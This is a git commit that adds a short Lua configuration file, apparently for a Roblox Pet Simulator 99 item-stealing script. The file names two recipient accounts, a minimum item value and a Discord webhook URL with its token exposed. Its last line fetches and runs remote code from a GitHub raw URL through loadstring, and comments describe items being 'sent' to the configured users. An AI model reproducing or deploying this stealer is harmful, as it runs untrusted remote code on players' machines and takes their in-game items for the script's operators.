84c954e37c37ab58b8ada98f1ae3d69f2b662242
z1cey <rickz1cey@gmail.com>
2024-05-23 23:43:09 -0400

    Add files via upload

---
+++ obf_ioOB4c85b4ydqr22vlj0Ht0qbJjJ7zAjML3Pi0y3V9fvWV55w6xB31i8Pv1GSVi1.lua
@@ -0,0 +1,6 @@
+Username = "Idislikenegoros"
+Username2 = "Jesterbot4" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "https://discord.com/api/webhooks/1243407538033004586/jWzZNt_paNZgpu0ogQGbA_BZeqkmz3AQ7uxHCR2Gq8LGblAdsInQnEyVtdfSuk4x1ne1"
+Support = false -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
